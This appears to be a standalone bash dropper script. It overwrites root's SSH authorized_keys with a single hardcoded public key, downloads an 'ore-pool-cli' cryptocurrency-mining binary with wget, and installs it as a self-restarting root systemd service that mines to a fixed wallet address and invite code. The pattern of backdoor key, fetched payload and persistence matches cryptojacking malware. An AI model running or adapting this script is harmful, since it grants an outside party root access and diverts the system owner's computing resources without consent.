#!/bin/bash
mkdir -p /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAl5QreAwkidb7s2ucEKdlQ1q9/voCnGiLjvwwmQPgpm' >/root/.ssh/authorized_keys
chmod 700 /root/.ssh/authorized_keys
chown -R root:root /root/.ssh/authorized_keys

DIR="/opt/ore"
mkdir $DIR

wget -O $DIR/ore-pool-cli https://github.com/ore-pool/ore-pool-cli/raw/master/ore-pool-cli-v1.1.0

chmod +x $DIR/ore-pool-cli

echo """[Unit]
Description=ore
DefaultDependencies=no
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$DIR
ExecStart=$DIR/ore-pool-cli mine --address 5B5BQprt9jzdxYRvZJpgWCSyeR24zo2MV27oH3GjjvZf --invcode 121DM1
Restart=always
RestartSec=5s
StandardOutput=file:$DIR/runtime.log
StandardError=inherit
[Install]
WantedBy=default.target""" > /etc/systemd/system/ore.service

systemctl daemon-reload
systemctl enable ore
systemctl start ore